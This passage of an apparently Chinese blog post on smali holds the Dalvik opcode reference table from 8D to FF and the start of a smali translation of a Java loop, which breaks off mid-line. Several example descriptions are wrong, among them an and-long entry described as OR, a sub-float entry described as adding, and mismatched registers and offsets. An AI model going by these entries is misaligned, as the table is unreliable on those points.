<td>8D00 - int-to-byte v0, v0 Converts the integer in v0 into a byte and puts the byte value into v0.</td>
</tr>
<tr>
<td>8E</td>
<td>int-to-char vx,vy</td>
<td>Converts the int value in vy to a char value and stores it in vx.</td>
<td>8E33 - int-to-char v3, v3 Converts the integer in v3 into a char and puts the char value into v3.</td>
</tr>
<tr>
<td>8F</td>
<td>int-to-short vx,vy</td>
<td>Converts the int value in vy to a short value and stores it in vx.</td>
<td>8F00 - int-to-short v0, v0 Converts the integer in v0 into a short and puts the short value into v3.</td>
</tr>
<tr>
<td>90</td>
<td>add-int vx,vy,vz</td>
<td>Calculates vy+vz and puts the result into vx.</td>
<td>9000 0203 - add-int v0, v2, v3 Adds v3 to v2 and puts the result into v04.</td>
</tr>
<tr>
<td>91</td>
<td>sub-int vx,vy,vz</td>
<td>Calculates vy-vz and puts the result into vx.</td>
<td>9100 0203 - sub-int v0, v2, v3 Subtracts v3 from v2 and puts the result into v0.</td>
</tr>
<tr>
<td>92</td>
<td>mul-int vx, vy, vz</td>
<td>Multiplies vz with wy and puts the result int vx.</td>
<td>9200 0203 - mul-int v0,v2,v3 Multiplies v2 with w3 and puts the result into v0</td>
</tr>
<tr>
<td>93</td>
<td>div-int vx,vy,vz</td>
<td>Divides vy with vz and puts the result into vx.</td>
<td>9303 0001 - div-int v3, v0, v1 Divides v0 with v1 and puts the result into v3.</td>
</tr>
<tr>
<td>94</td>
<td>rem-int vx,vy,vz</td>
<td>Calculates vy % vz and puts the result into vx.</td>
<td>9400 0203 - rem-int v0, v2, v3 Calculates v3 % v2 and puts the result into v0.</td>
</tr>
<tr>
<td>95</td>
<td>and-int vx, vy, vz</td>
<td>Calculates vy AND vz and puts the result into vx.</td>
<td>9503 0001 - and-int v3, v0, v1 Calculates v0 AND v1 and puts the result into v3.</td>
</tr>
<tr>
<td>96</td>
<td>or-int vx, vy, vz</td>
<td>Calculates vy OR vz and puts the result into vx.</td>
<td>9603 0001 - or-int v3, v0, v1 Calculates v0 OR v1 and puts the result into v3.</td>
</tr>
<tr>
<td>97</td>
<td>xor-int vx, vy, vz</td>
<td>Calculates vy XOR vz and puts the result into vx.</td>
<td>9703 0001 - xor-int v3, v0, v1 Calculates v0 XOR v1 and puts the result into v3.</td>
</tr>
<tr>
<td>98</td>
<td>shl-int vx, vy, vz</td>
<td>Shift vy left by the positions specified by vz and store the result into vx.</td>
<td>9802 0001 - shl-int v2, v0, v1 Shift v0 left by the positions specified by v1 and store the result in v2.</td>
</tr>
<tr>
<td>99</td>
<td>shr-int vx, vy, vz</td>
<td>Shift vy right by the positions specified by vz and store the result into vx.</td>
<td>9902 0001 - shr-int v2, v0, v1 Shift v0 right by the positions specified by v1 and store the result in v2.</td>
</tr>
<tr>
<td>9A</td>
<td>ushr-int vx, vy, vz</td>
<td>Unsigned shift right (&gt;&gt;&gt;) vy by the positions specified by vz and store the result into vx.</td>
<td>9A02 0001 - ushr-int v2, v0, v1 Unsigned shift v0 right by the positions specified by v1 and store the result in v2.</td>
</tr>
<tr>
<td>9B</td>
<td>add-long vx, vy, vz</td>
<td>Adds vy to vz and puts the result into vx1.</td>
<td>9B00 0305 - add-long v0, v3, v5 The long value in v3,v4 is added to the value in v5,v6 and the result is stored in v0,v1.</td>
</tr>
<tr>
<td>9C</td>
<td>sub-long vx,vy,vz</td>
<td>Calculates vy-vz and puts the result into vx1.</td>
<td>9C00 0305 - sub-long v0, v3, v5 Subtracts the long value in v5,v6 from the long value in v3,v4 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>9D</td>
<td>mul-long vx,vy,vz</td>
<td>Calculates vy*vz and puts the result into vx1.</td>
<td>9D00 0305 - mul-long v0, v3, v5 Multiplies the long value in v5,v6 with the long value in v3,v4 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>9E</td>
<td>div-long vx, vy, vz</td>
<td>Calculates vy/vz and puts the result into vx1.</td>
<td>9E06 0002 - div-long v6, v0, v2 Divides the long value in v0,v1 with the long value in v2,v3 and pust the result into v6,v7.</td>
</tr>
<tr>
<td>9F</td>
<td>rem-long vx,vy,vz</td>
<td>Calculates vy % vz and puts the result into vx1.</td>
<td>9F06 0002 - rem-long v6, v0, v2 Calculates v0,v1 % v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>A0</td>
<td>and-long vx, vy, vz</td>
<td>Calculates the vy AND vz and puts the result into vx1.</td>
<td>A006 0002 - and-long v6, v0, v2 Calculates v0,v1 AND v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>A1</td>
<td>or-long vx, vy, vz</td>
<td>Calculates the vy OR vz and puts the result into vx1.</td>
<td>A106 0002 - or-long v6, v0, v2 Calculates v0,v1 OR v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>A2</td>
<td>xor-long vx, vy, vz</td>
<td>Calculates the vy XOR vz and puts the result into vx1.</td>
<td>A206 0002 - xor-long v6, v0, v2 Calculates v0,v1 XOR v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>A3</td>
<td>shl-long vx, vy, vz</td>
<td>Shifts left vy by vz positions and stores the result in vx1.</td>
<td>A302 0004 - shl-long v2, v0, v4 Shift v0,v1 by postions specified by v4 and puts the result into v2,v3.</td>
</tr>
<tr>
<td>A4</td>
<td>shr-long vx,vy,vz</td>
<td>Shifts right vy by vz positions and stores the result in vx1.</td>
<td>A402 0004 - shr-long v2, v0, v4 Shift v0,v1 by postions specified by v4 and puts the result into v2,v3.</td>
</tr>
<tr>
<td>A5</td>
<td>ushr-long vx, vy, vz</td>
<td>Unsigned shifts right vy by vz positions and stores the result in vx1.</td>
<td>A502 0004 - ushr-long v2, v0, v4 Unsigned shift v0,v1 by postions specified by v4 and puts the result into v2,v3.</td>
</tr>
<tr>
<td>A6</td>
<td>add-float vx,vy,vz</td>
<td>Adds vy to vz and puts the result into vx.</td>
<td>A600 0203 - add-float v0, v2, v3 Adds the floating point numbers in v2 and v3 and puts the result into v0.</td>
</tr>
<tr>
<td>A7</td>
<td>sub-float vx,vy,vz</td>
<td>Calculates vy-vz and puts the result into vx.</td>
<td>A700 0203 - sub-float v0, v2, v3 Calculates v2-v3 and puts the result into v0.</td>
</tr>
<tr>
<td>A8</td>
<td>mul-float vx, vy, vz</td>
<td>Multiplies vy with vz and puts the result into vx.</td>
<td>A803 0001 - mul-float v3, v0, v1 Multiplies v0 with v1 and puts the result into v3.</td>
</tr>
<tr>
<td>A9</td>
<td>div-float vx, vy, vz</td>
<td>Calculates vy/vz and puts the result into vx.</td>
<td>A903 0001 - div-float v3, v0, v1 Divides v0 with v1 and puts the result into v3.</td>
</tr>
<tr>
<td>AA</td>
<td>rem-float vx,vy,vz</td>
<td>Calculates vy % vz and puts the result into vx.</td>
<td>AA03 0001 - rem-float v3, v0, v1 Calculates v0 % v1 and puts the result into v3.</td>
</tr>
<tr>
<td>AB</td>
<td>add-double vx,vy,vz</td>
<td>Adds vy to vz and puts the result into vx1.</td>
<td>AB00 0305 - add-double v0, v3, v5 Adds the double value in v5,v6 registers to the double value in v3,v4 registers and places the result in v0,v1 registers.</td>
</tr>
<tr>
<td>AC</td>
<td>sub-double vx,vy,vz</td>
<td>Calculates vy-vz and puts the result into vx1.</td>
<td>AC00 0305 - sub-double v0, v3, v5 Subtracts the value in v5,v6 from the value in v3,v4 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>AD</td>
<td>mul-double vx, vy, vz</td>
<td>Multiplies vy with vz and puts the result into vx1.</td>
<td>AD06 0002 - mul-double v6, v0, v2 Multiplies the double value in v0,v1 with the double value in v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>AE</td>
<td>div-double vx, vy, vz</td>
<td>Calculates vy/vz and puts the result into vx1.</td>
<td>AE06 0002 - div-double v6, v0, v2 Divides the double value in v0,v1 with the double value in v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>AF</td>
<td>rem-double vx,vy,vz</td>
<td>Calculates vy % vz and puts the result into vx1.</td>
<td>AF06 0002 - rem-double v6, v0, v2 Calculates v0,v1 % v2,v3 and puts the result into v6,v7.</td>
</tr>
<tr>
<td>B0</td>
<td>add-int/2addr vx,vy</td>
<td>Adds vy to vx.</td>
<td>B010 - add-int/2addr v0,v1 Adds v1 to v0.</td>
</tr>
<tr>
<td>B1</td>
<td>sub-int/2addr vx,vy</td>
<td>Calculates vx-vy and puts the result into vx.</td>
<td>B140 - sub-int/2addr v0, v4 Subtracts v4 from v0 and puts the result into v0.</td>
</tr>
<tr>
<td>B2</td>
<td>mul-int/2addr vx,vy</td>
<td>Multiplies vx with vy.</td>
<td>B210 - mul-int/2addr v0, v1 Multiples v0 with v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B3</td>
<td>div-int/2addr vx,vy</td>
<td>Divides vx with vy and puts the result into vx.</td>
<td>B310 - div-int/2addr v0, v1 Divides v0 with v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B4</td>
<td>rem-int/2addr vx,vy</td>
<td>Calculates vx % vy and puts the result into vx</td>
<td>B410 - rem-int/2addr v0, v1  Calculates v0 % v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B5</td>
<td>and-int/2addr vx, vy</td>
<td>Calculates vx AND vy and puts the result into vx.</td>
<td>B510 - and-int/2addr v0, v1 Calculates v0 AND v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B6</td>
<td>or-int/2addr vx, vy</td>
<td>Calculates vx OR vy and puts the result into vx.</td>
<td>B610 - or-int/2addr v0, v1 Calculates v0 OR v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B7</td>
<td>xor-int/2addr vx, vy</td>
<td>Calculates vx XOR vy and puts the result into vx.</td>
<td>B710 - xor-int/2addr v0, v1 Calculates v0 XOR v1 and puts the result into v0.</td>
</tr>
<tr>
<td>B8</td>
<td>shl-int/2addr vx, vy</td>
<td>Shifts vx left by vy positions.</td>
<td>B810 - shl-int/2addr v0, v1 Shift v0 left by v1 positions.</td>
</tr>
<tr>
<td>B9</td>
<td>shr-int/2addr vx, vy</td>
<td>Shifts vx right by vy positions.</td>
<td>B910 - shr-int/2addr v0, v1 Shift v0 right by v1 positions.</td>
</tr>
<tr>
<td>BA</td>
<td>ushr-int/2addr vx, vy</td>
<td>Unsigned shift right (&gt;&gt;&gt;) vx by the positions specified by vy.</td>
<td>BA10 - ushr-int/2addr v0, v1 Unsigned shift v0 by the positions specified by v1.</td>
</tr>
<tr>
<td>BB</td>
<td>add-long/2addr vx,vy</td>
<td>Adds vy to vx1.</td>
<td>BB20 - add-long/2addr v0, v2 Adds the long value in v2,v3 registers to the long value in v0,v1 registers.</td>
</tr>
<tr>
<td>BC</td>
<td>sub-long/2addr vx,vy</td>
<td>Calculates vx-vy and puts the result into vx1.</td>
<td>BC70 - sub-long/2addr v0, v7 Subtracts the long value in v7,v8 from the long value in v0,v1 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>BD</td>
<td>mul-long/2addr vx,vy</td>
<td>Calculates vx*vy and puts the result into vx1.</td>
<td>BD70 - mul-long/2addr v0, v7 Multiplies the long value in v7,v8 with the long value in v0,v1 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>BE</td>
<td>div-long/2addr vx, vy</td>
<td>Calculates vx/vy and puts the result into vx1.</td>
<td>BE20 - div-long/2addr v0, v2 Divides the long value in v0,v1 with the long value in v2,v3 and puts the result into v0,v1</td>
</tr>
<tr>
<td>BF</td>
<td>rem-long/2addr vx,vy</td>
<td>Calculates vx % vy and puts the result into vx1.</td>
<td>BF20 - rem-long/2addr v0, v2 Calculates v0,v1 % v2,v3 and puts the result into v0,v1</td>
</tr>
<tr>
<td>C0</td>
<td>and-long/2addr vx, vy</td>
<td>Calculates vx AND vy and puts the result into vx1.</td>
<td>C020 - and-long/2addr v0, v2 Calculates v0,v1 OR v2,v3 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>C1</td>
<td>or-long/2addr vx, vy</td>
<td>Calculates vx OR vy and puts the result into vx1.</td>
<td>C120 - or-long/2addr v0, v2 Calculates v0,v1 OR v2,v3 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>C2</td>
<td>xor-long/2addr vx, vy</td>
<td>Calculates vx XOR vy and puts the result into vx1.</td>
<td>C220 - xor-long/2addr v0, v2 Calculates v0,v1 XOR v2,v3 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>C3</td>
<td>shl-long/2addr vx, vy</td>
<td>Shifts left the value in vx,vx+1 by the positions specified by vy and stores the result in vx,vx+1.</td>
<td>C320 - shl-long/2addr v0, v2 Shifts left v0,v1 by the positions specified by v2.</td>
</tr>
<tr>
<td>C4</td>
<td>shr-long/2addr vx, vy</td>
<td>Shifts right the value in vx,vx+1 by the positions specified by vy and stores the result in vx,vx+1.</td>
<td>C420 - shr-long/2addr v0, v2 Shifts right v0,v1 by the positions specified by v2.</td>
</tr>
<tr>
<td>C5</td>
<td>ushr-long/2addr vx, vy</td>
<td>Unsigned shifts right the value in vx,vx+1 by the positions specified by vy and stores the result in vx,vx+1.</td>
<td>C520 - ushr-long/2addr v0, v2 Unsigned shifts right v0,v1 by the positions specified by v2.</td>
</tr>
<tr>
<td>C6</td>
<td>add-float/2addr vx,vy</td>
<td>Adds vy to vx.</td>
<td>C640 - add-float/2addr v0,v4 Adds v4 to v0.</td>
</tr>
<tr>
<td>C7</td>
<td>sub-float/2addr vx,vy</td>
<td>Calculates vx-vy and stores the result in vx.</td>
<td>C740 - sub-float/2addr v0,v4 Adds v4 to v0.</td>
</tr>
<tr>
<td>C8</td>
<td>mul-float/2addr vx, vy</td>
<td>Multiplies vx with vy.</td>
<td>C810 - mul-float/2addr v0, v1 Multiplies v0 with v1.</td>
</tr>
<tr>
<td>C9</td>
<td>div-float/2addr vx, vy</td>
<td>Calculates vx/vy and puts the result into vx.</td>
<td>C910 - div-float/2addr v0, v1 Divides v0 with v1 and puts the result into v0.</td>
</tr>
<tr>
<td>CA</td>
<td>rem-float/2addr vx,vy</td>
<td>Calculates vx/vy and puts the result into vx.</td>
<td>CA10 - rem-float/2addr v0, v1  Calculates v0 % v1 and puts the result into v0.</td>
</tr>
<tr>
<td>CB</td>
<td>add-double/2addr vx, vy</td>
<td>Adds vy to vx1.</td>
<td>CB70 - add-double/2addr v0, v7 Adds v7 to v0.</td>
</tr>
<tr>
<td>CC</td>
<td>sub-double/2addr vx, vy</td>
<td>Calculates vx-vy and puts the result into vx1.</td>
<td>CC70 - sub-double/2addr v0, v7 Subtracts the value in v7,v8 from the value in v0,v1 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>CD</td>
<td>mul-double/2addr vx, vy</td>
<td>Multiplies vx with vy1.</td>
<td>CD20 - mul-double/2addr v0, v2 Multiplies the double value in v0,v1 with the double value in v2,v3 and puts the result into v0,v1.</td>
</tr>
<tr>
<td>CE</td>
<td>div-double/2addr vx, vy</td>
<td>Calculates vx/vy and puts the result into vx1.</td>
<td>CE20 - div-double/2addr v0, v2 Divides the double value in v0,v1 with the double value in v2,v3 and puts the value into v0,v1.</td>
</tr>
<tr>
<td>CF</td>
<td>rem-double/2addr vx,vy</td>
<td>Calculates vx % vy and puts the result into vx1.</td>
<td>CF20 - rem-double/2addr v0, v2  Calculates v0,v1 % v2,v3 and puts the value into v0,v1.</td>
</tr>
<tr>
<td>D0</td>
<td>add-int/lit16 vx,vy,lit16</td>
<td>Adds vy to lit16 and stores the result into vx.</td>
<td>D001 D204 - add-int/lit16 v1, v0, #int 1234 // #04d2 Adds v0 to literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D1</td>
<td>sub-int/lit16 vx,vy,lit16</td>
<td>Calculates vy - lit16 and stores the result into vx.</td>
<td>D101 D204 - sub-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 - literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D2</td>
<td>mul-int/lit16 vx,vy,lit16</td>
<td>Calculates vy * lit16 and stores the result into vx.</td>
<td>D201 D204 - mul-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 * literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D3</td>
<td>div-int/lit16 vx,vy,lit16</td>
<td>Calculates vy / lit16 and stores the result into vx.</td>
<td>D301 D204 - div-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 / literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D4</td>
<td>rem-int/lit16 vx,vy,lit16</td>
<td>Calculates vy % lit16 and stores the result into vx.</td>
<td>D401 D204 - rem-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 % literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D5</td>
<td>and-int/lit16 vx,vy,lit16</td>
<td>Calculates vy AND lit16 and stores the result into vx.</td>
<td>D501 D204 - and-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 AND literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D6</td>
<td>or-int/lit16 vx,vy,lit16</td>
<td>Calculates vy OR lit16 and stores the result into vx.</td>
<td>D601 D204 - or-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 OR literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D7</td>
<td>xor-int/lit16 vx,vy,lit16</td>
<td>Calculates vy XOR lit16 and stores the result into vx.</td>
<td>D701 D204 - xor-int/lit16 v1, v0, #int 1234 // #04d2 Calculates v0 XOR literal 1234 and stores the result into v1.</td>
</tr>
<tr>
<td>D8</td>
<td>add-int/lit8 vx,vy,lit8</td>
<td>Adds vy to lit8 and stores the result into vx.</td>
<td>D800 0201 - add-int/lit8 v0,v2, #int1 Adds literal 1 to v2 and stores the result into v0.</td>
</tr>
<tr>
<td>D9</td>
<td>sub-int/lit8 vx,vy,lit8</td>
<td>Calculates vy-lit8 and stores the result into vx.</td>
<td>D900 0201 - sub-int/lit8 v0,v2, #int1 Calculates v2-1 and stores the result into v0.</td>
</tr>
<tr>
<td>DA</td>
<td>mul-int/lit-8 vx,vy,lit8</td>
<td>Multiplies vy with lit8 8-bit literal constant and puts the result into vx.</td>
<td>DA00 0002 - mul-int/lit8 v0,v0, #int2 Multiplies v0 with literal 2 and puts the result into v0.</td>
</tr>
<tr>
<td>DB</td>
<td>div-int/lit8 vx,vy,lit8</td>
<td>Calculates vy/lit8 and stores the result into vx.</td>
<td>DB00 0203 - mul-int/lit8 v0,v2, #int3 Calculates v2/3 and stores the result into v0.</td>
</tr>
<tr>
<td>DC</td>
<td>rem-int/lit8 vx,vy,lit8</td>
<td>Calculates vy % lit8 and stores the result into vx.</td>
<td>DC00 0203 - rem-int/lit8 v0,v2, #int3 Calculates v2 % 3 and stores the result into v0.</td>
</tr>
<tr>
<td>DD</td>
<td>and-int/lit8 vx,vy,lit8</td>
<td>Calculates vy AND lit8 and stores the result into vx.</td>
<td>DD00 0203 - and-int/lit8 v0,v2, #int3 Calculates v2 AND 3 and stores the result into v0.</td>
</tr>
<tr>
<td>DE</td>
<td>or-int/lit8 vx, vy, lit8</td>
<td>Calculates vy OR lit8 and puts the result into vx.</td>
<td>DE00 0203 - or-int/lit8 v0, v2, #int 3 Calculates v2 OR literal 3 and puts the result into v0.</td>
</tr>
<tr>
<td>DF</td>
<td>xor-int/lit8 vx, vy, lit8</td>
<td>Calculates vy XOR lit8 and puts the result into vx.</td>
<td>DF00 0203   | 0008: xor-int/lit8 v0, v2, #int 3 Calculates v2 XOR literal 3 and puts the result into v0.</td>
</tr>
<tr>
<td>E0</td>
<td>shl-int/lit8 vx, vy, lit8</td>
<td>Shift v0 left by the bit positions specified by the literal constant and put the result into vx.</td>
<td>E001 0001 - shl-int/lit8 v1, v0, #int 1 Shift v0 left by 1 position and put the result into v1.</td>
</tr>
<tr>
<td>E1</td>
<td>shr-int/lit8 vx, vy, lit8</td>
<td>Shift v0 right by the bit positions specified by the literal constant and put the result into vx.</td>
<td>E101 0001 - shr-int/lit8 v1, v0, #int 1 Shift v0 right by 1 position and put the result into v1.</td>
</tr>
<tr>
<td>E2</td>
<td>ushr-int/lit8 vx, vy, lit8</td>
<td>Unsigned right shift of v0 (&gt;&gt;&gt;) by the bit positions specified by the literal constant and put the result into vx.</td>
<td>E201 0001 - ushr-int/lit8 v1, v0, #int 1 Unsigned shift v0 right by 1 position and put the result into v1.</td>
</tr>
<tr>
<td>E3</td>
<td>unused_E3</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E4</td>
<td>unused_E4</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E5</td>
<td>unused_E5</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E6</td>
<td>unused_E6</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E7</td>
<td>unused_E7</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E8</td>
<td>unused_E8</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E9</td>
<td>unused_E9</td>
<td></td>
<td></td>
</tr>
<tr>
<td>EA</td>
<td>unused_EA</td>
<td></td>
<td></td>
</tr>
<tr>
<td>EB</td>
<td>unused_EB</td>
<td></td>
<td></td>
</tr>
<tr>
<td>EC</td>
<td>unused_EC</td>
<td></td>
<td></td>
</tr>
<tr>
<td>ED</td>
<td>unused_ED</td>
<td></td>
<td></td>
</tr>
<tr>
<td>EE</td>
<td>execute-inline {parameters},inline ID</td>
<td>Executes the inline method identified by inline ID6.</td>
<td>EE20 0300 0100 - execute-inline {v1, v0}, inline #0003 Executes inline method #3 using v1 as “this” and passing one parameter in v0.</td>
</tr>
<tr>
<td>EF</td>
<td>unused_EF</td>
<td></td>
<td></td>
</tr>
<tr>
<td>F0</td>
<td>invoke-direct-empty</td>
<td>Stands as a placeholder for pruned empty methods like Object.<init>. This acts as nop during normal execution6.</init></td>
<td>F010 F608 0000 - invoke-direct-empty {v0}, Ljava/lang/Object;.<init>:()V // method@08f6 Replacement for the empty method java/lang/Object;<init>.</init></init></td>
</tr>
<tr>
<td>F1</td>
<td>unused_F1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>F2</td>
<td>iget-quick vx,vy,offset</td>
<td>Gets the value stored at offset in vy instance’s data area to vx6.</td>
<td>F221 1000 - iget-quick v1, v2, [obj+0010] Gets the value at offset 0CH of the instance pointed by v2 and stores the object reference in v1.</td>
</tr>
<tr>
<td>F3</td>
<td>iget-wide-quick vx,vy,offset</td>
<td>Gets the object reference value stored at offset in vy instance’s data area to vx,vx+16.</td>
<td>F364 3001 - iget-wide-quick v4, v6, [obj+0130] Gets the value at offset 130H of the instance pointed by v6 and stores the object reference in v4,v5.</td>
</tr>
<tr>
<td>F4</td>
<td>iget-object-quick vx,vy,offset</td>
<td>Gets the object reference value stored at offset in vy instance’s data area to vx6.</td>
<td>F431 0C00 - iget-object-quick v1, v3, [obj+000c] Gets the object reference value at offset 0CH of the instance pointed by v3 and stores the object reference in v1.</td>
</tr>
<tr>
<td>F5</td>
<td>iput-quick vx,vy,offset</td>
<td>Puts the value stored in vx to offset in vy instance’s data area6.</td>
<td>F521 1000 - iput-quick v1, v2, [obj+0010] Puts the object reference value in v1 to offset 10H of the instance pointed by v2.</td>
</tr>
<tr>
<td>F6</td>
<td>iput-wide-quick vx,vy,offset</td>
<td>Puts the value stored in vx,vx+1 to offset in vy instance’s data area6.</td>
<td>F652 7001 - iput-wide-quick v2, v5, [obj+0170] Puts the value in v2,v3 to offset 170H of the instance pointed by v5.</td>
</tr>
<tr>
<td>F7</td>
<td>iput-object-quick vx,vy,offset</td>
<td>Puts the object reference value stored in vx to offset in vy instance’s data area to vx6.</td>
<td>F701 4C00 - iput-object-quick v1, v0, [obj+004c] Puts the object reference value in v1 to offset 0CH of the instance pointed by v3.</td>
</tr>
<tr>
<td>F8</td>
<td>invoke-virtual-quick {parameters},vtable offset</td>
<td>Invokes a virtual method using the vtable of the target object6.</td>
<td>F820 B800 CF00 - invoke-virtual-quick {v15, v12}, vtable #00b8 Invokes a virtual method. The target object instance is pointed by v15 and vtable entry #B8 points to the method to be called. v12 is a parameter to the method call.</td>
</tr>
<tr>
<td>F9</td>
<td>invoke-virtual-quick/range {parameter range},vtable offset</td>
<td>Invokes a virtual method using the vtable of the target object6</td>
<td>F906 1800 0000 - invoke-virtual-quick/range {v0..v5},vtable #0018 Invokes a method using the vtable of the instance pointed by v0. v1..v5 registers are parameters to the method call.</td>
</tr>
<tr>
<td>FA</td>
<td>invoke-super-quick {parameters},vtable offset</td>
<td>Invokes a virtual method in the target object’s immediate parent class using the vtable of that parent class6.</td>
<td>FA40 8100 3254 - invoke-super-quick {v2, v3, v4, v5}, vtable #0081 Invokes a method using the vtable of the immediate parent class of instance pointed by v2. v3, v4 and v5 registers are parameters to the method call.</td>
</tr>
<tr>
<td>FB</td>
<td>invoke-super-quick/range {register range},vtable offset</td>
<td>Invokes a virtual method in the target object’s immediate parent class using the vtable of that parent class6.</td>
<td>F906 1B00 0000 - invoke-super-quick/range {v0..v5}, vtable #001b Invokes a method using the vtable of the immediate parent class of instance pointed by v0. v1..v5 registers are parameters to the method call.</td>
</tr>
<tr>
<td>FC</td>
<td>unused_FC</td>
<td></td>
<td></td>
</tr>
<tr>
<td>FD</td>
<td>unused_FD</td>
<td></td>
<td></td>
</tr>
<tr>
<td>FE</td>
<td>unused_FE</td>
<td></td>
<td></td>
</tr>
<tr>
<td>FF</td>
<td>unused_FF</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>最后附上循环、switch 以及 try-catch 三大常见的语句的事例。</p>
<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(String str) &#123;<br>    String ans = <span class="hljs-string">&quot;&quot;</span>;<br>    for (int i = 0 ; i &lt; str.length(); i++)&#123;<br>        ans += str.charAt(i);<br>    &#125;<br>    Log.e(<span class="hljs-string">&quot;ans:&quot;</span>, ans);<br>&#125;<br>&lt;=对应smali=&gt;<br><br><span class="hljs-comment"># public void encrypt(String str) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(<span class="hljs-class">Ljava/lang/String;</span>)V <br><span class="hljs-keyword">.locals</span> 4 <br><span class="hljs-keyword">.param</span> p1, <span class="hljs-string">&quot;str&quot;</span>    <span class="hljs-comment"># Ljava/lang/String;</span><br><span class="hljs-keyword">.prologue</span> <br><br><span class="hljs-comment"># String ans = &quot;&quot;;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-string </span>v0, <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-keyword">.local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span> <br><br><span class="hljs-comment"># for (int i  0 ; i &lt; str.length();i++)&#123;</span><br><span class="hljs-comment"># int i=0 =&gt;v1</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const/4 </span>v1, 0x0<br><span class="hljs-keyword">.local</span> v1, <span class="hljs-string">&quot;i&quot;</span>:I<span class="hljs-keyword"></span><br><span class="hljs-keyword">:goto_0</span>				<span class="hljs-comment"># for_start_place</span><br><br><span class="hljs-comment"># str.length()=&gt;v2</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;p1&#125;, <span class="hljs-class">Ljava/lang/String;</span>-&gt;length()I<span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result </span>v2 <br><br><span class="hljs-comment"># i&lt;str.length() </span><span class="hljs-built_in"></span><br><span class="hljs-built_in">if-ge </span>v1, v2,<span class="hljs-keyword"> :cond_0</span> <br><br><span class="hljs-comment"># ans += str.charAt(i); </span><br><span class="hljs-comment"># str.charAt(i) =&gt; v2</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">new-instance </span>v2, <span class="hljs-class">Ljava/lang/StringBuilder;</span> <span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-direct </span>&#123;v2&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;&lt;init&gt;()V<br>invoke-virtual&#123;v2,v0&#125;,<span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;append(<span class="hljs-class">Ljava/lang/String;</span>)<span class="hljs-class">Ljava/lang/StringBuilder;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v2 <br><br><span class="hljs-comment">#str.charAt(i) =&gt; v3</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;p1, v1&#125;, <span class="hljs-class">Ljava/lang/String;</span>-&gt;charAt(I)C <span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result </span>v3<br><br><span class="hljs-comment"># ans += v3 =&gt;v0</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;v2, v3&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;append(C)<span class="hljs-class">Ljava/lang/StringBuilder;</span> <span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v2 <span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;v2&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;toString()<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v0<br><br><span class="hljs-comment"># i++</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">add-int/lit8 </span>v1, v1, 0x1<span class="hljs-built_in"></span><br><span class="hljs-built_in">goto </span>:goto_0<br><br><span class="hljs-comment"># Log.e(&quot;ans:&quot;,ans);</span><span class="hljs-keyword"></span><br><span class="hljs-keyword">:cond_0</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-string </span>v2, <span class="hljs-string">&quot;ans:&quot;</span> <span 